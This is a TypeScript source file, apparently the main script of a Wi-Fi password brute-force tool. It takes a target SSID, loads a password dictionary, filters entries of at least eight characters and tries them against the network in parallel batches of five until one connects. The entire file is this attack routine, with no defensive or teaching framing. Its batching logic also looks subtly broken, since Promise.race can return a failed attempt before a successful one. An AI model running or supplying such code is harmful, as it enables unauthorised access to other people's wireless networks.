import connect from './function/connect';
import read from './function/read';
import input from './function/input';
import { IResult } from './interface';
import { EDictionary } from './constants';
// 字典
const Dictionary_name: EDictionary = EDictionary.common;

async function main() {
  function sliceArray<T>(arr: Array<T>, size: number): Array<Array<T>>{
    let result: Array<Array<T>> = [];
    for (let i = 0, len = arr.length; i < len; i += size){
      result.push(arr.slice(i, i + size));
    }
    return result;
  };
  async function sliceConnect(passwordList: Array<string>): Promise<IResult> {
    const promiseList: Array<Promise<IResult>> = await passwordList.map((password: string): Promise<IResult> => {
      return connect(Network_ssid, password);
    });
    const promiseResult: IResult = await Promise.race(promiseList);
    return promiseResult;

  }
  const Network_ssid: string = await input();
  const Dictionary: IResult = await read(Dictionary_name);
  const PasswordList: Array<string> = Dictionary.OperationObject.toString().split('\n').filter((p: string): boolean => p.length >= 8);
  const SlicePasswordLists: Array<Array<string>> = sliceArray<string>(PasswordList, 5);
  let result: IResult = {
    OperationResult: false,
    OperationObject: `\n connect ${Network_ssid} failed`
  };
  for (let i = 0; i < SlicePasswordLists.length; i++) {
    result = await sliceConnect(SlicePasswordLists[i]);
    if (result.OperationResult) {
      break;
    }
  }
  console.log(result.OperationObject);
}

main();